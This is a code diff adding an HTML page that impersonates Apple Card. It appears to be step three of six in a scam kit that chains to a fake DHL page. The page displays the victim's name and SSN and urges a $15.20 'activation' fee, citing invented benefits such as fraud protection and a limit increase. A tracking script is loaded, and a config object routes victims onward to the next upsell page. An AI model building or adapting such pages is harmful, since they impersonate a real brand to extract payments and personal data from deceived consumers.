@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<script src="../../tracker.js"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Card Activation — Apple Card</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../upsell.css">
+</head>
+<body>
+
+<div class="loading-screen" id="loadingScreen">
+  <img class="loading-logo" src="../../assets/images/black.svg" alt="">
+  <div class="loading-spinner"></div>
+  <div class="loading-msg">Preparing account activation...</div>
+</div>
+
+<div class="page" id="mainPage" style="display:none">
+  <nav class="nav">
+    <div class="nav-spacer"></div>
+    <div class="nav-title">Activation</div>
+    <div class="nav-step">3/6</div>
+  </nav>
+
+  <div class="content">
+    <div class="hero fade-up">
+      <div class="hero-icon">
+        <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
+      </div>
+      <h1>Activate your<br>Apple Card account</h1>
+      <p>Activate your account now to start using the virtual card in Apple Pay the moment your physical card arrives.</p>
+    </div>
+
+    <div class="detail-card fade-up">
+      <div class="dc-row">
+        <span class="label">Holder</span>
+        <span class="value" id="customerName">—</span>
+      </div>
+      <div class="dc-row">
+        <span class="label">SSN</span>
+        <span class="value" id="customerNif">—</span>
+      </div>
+      <div class="dc-row">
+        <span class="label">Virtual card</span>
+        <span class="value warn"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17h-2v-2h2v2zm2.07-7.75l-.9.92C12.45 12.9 12 13.5 12 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H7c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg> Not activated</span>
+      </div>
+      <div class="dc-row">
+        <span class="label">Apple Pay</span>
+        <span class="value warn">Pending</span>
+      </div>
+      <div class="dc-row">
+        <span class="label">Credit line</span>
+        <span class="value">Pre-approved</span>
+      </div>
+    </div>
+
+    <div class="reasons fade-up">
+      <div class="reason">
+        <div class="reason-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+        <div class="reason-text"><strong>Apple Pay right away</strong>Use the virtual card on iPhone, Watch, and Mac before the physical card arrives.</div>
+      </div>
+      <div class="reason">
+        <div class="reason-icon"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg></div>
+        <div class="reason-text"><strong>Fraud protection</strong>Activation confirms your identity with the issuer — blocks unauthorized use attempts.</div>
+      </div>
+      <div class="reason">
+        <div class="reason-icon"><svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg></div>
+        <div class="reason-text"><strong>Higher limit</strong>Activated accounts have their limit reviewed upward after 30 days of regular use.</div>
+      </div>
+    </div>
+
+    <div class="price-block fade-up">
+      <span class="price-tag">One-time cost</span>
+      <div class="price-value" data-price-display>$15.20</div>
+      <div class="price-desc">Activation · Apple Pay provisioning · Fraud protection</div>
+    </div>
+
+    <button class="pay-btn" id="payBtn">
+      <span class="pay-btn-label">Activate now · <span data-price-display>$15.20</span></span>
+    </button>
+
+    <div class="trust-line">
+      <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
+      Secure payment · Card · PayPal · Bank
+    </div>
+
+    <button class="skip-link" id="skipBtn">Activate later</button>
+  </div>
+</div>
+
+<script>
+window.UPSELL_CONFIG = {
+  id: 'upsell-ativacao-us',
+  title: 'Apple Pay Activation',
+  price: 15.20,
+  next: '../upp3-dhl/index.html'
+};
+</script>
+<script src="../upsell.js"></script>
+</body>
+</html>
